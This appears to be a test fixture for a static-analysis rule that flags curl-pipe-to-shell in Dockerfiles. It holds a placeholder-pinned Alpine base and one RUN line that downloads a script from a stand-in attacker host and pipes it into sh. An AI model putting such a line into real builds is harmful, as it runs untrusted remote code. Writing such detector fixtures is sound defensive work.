# rule: megasast/docker-curl-pipe-sh
FROM alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
RUN curl http://evil.example/x.sh | sh
